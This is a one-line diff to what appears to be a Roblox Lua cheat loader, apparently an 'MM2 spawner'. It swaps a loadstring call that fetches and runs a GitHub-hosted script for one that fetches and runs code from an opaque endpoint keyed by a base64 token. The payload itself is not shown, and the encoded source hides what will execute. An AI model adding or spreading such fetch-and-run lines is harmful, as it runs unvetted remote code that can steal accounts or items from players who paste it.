@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/PandanHUB/lua/refs/heads/main/mm2.spawner"))()
+loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjZhYWI3YjE1LTU1NTYtNGM2Mi05NTVmLThiZDE1NDJhMzE4NyIsImtpbmQiOiJtZWRpYSIsInZpc3VhbCI6eyJpZCI6InVuaXZlcnNhbCJ9fQ"))()
